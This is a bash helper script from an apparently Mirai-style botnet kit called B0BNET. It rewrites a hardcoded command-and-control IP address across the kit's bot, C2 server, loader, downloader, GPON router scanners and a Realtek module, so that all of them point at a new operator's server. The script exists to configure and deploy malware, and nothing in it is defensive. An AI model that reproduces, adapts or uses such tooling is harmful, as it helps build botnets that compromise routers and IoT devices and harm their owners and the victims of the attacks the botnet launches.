#!/bin/bash
if [ -z "$1" ]; then
    echo "Usage: ./set_ip.sh <your_server_ip>"
    exit 1
fi

IP="$1"
IP_COMMA=$(echo "$IP" | tr '.' ',')

echo "Replacing hardcoded IP with $IP ..."

# String replacements
sed -i "s/103\.67\.244\.57/$IP/g" /root/B0BNET/bot/includes.h
sed -i "s/103\.67\.244\.57/$IP/g" /root/B0BNET/cnc/main.go
sed -i "s/103\.67\.244\.57/$IP/g" /root/B0BNET/loader/src/headers/config.h
sed -i "s/103\.67\.244\.57/$IP/g" /root/B0BNET/loader/src/main.c
sed -i "s/103\.67\.244\.57/$IP/g" /root/B0BNET/bot/gpon8080_scanner.c
sed -i "s/103\.67\.244\.57/$IP/g" /root/B0BNET/bot/gpon80_scanner.c
sed -i "s/103\.67\.244\.57/$IP/g" /root/B0BNET/bot/realtek.c

# DLR uses comma-separated IP
sed -i "s/103,67,244,57/$IP_COMMA/g" /root/B0BNET/dlr/main.c

echo "Done. IP set to $IP in all source files."
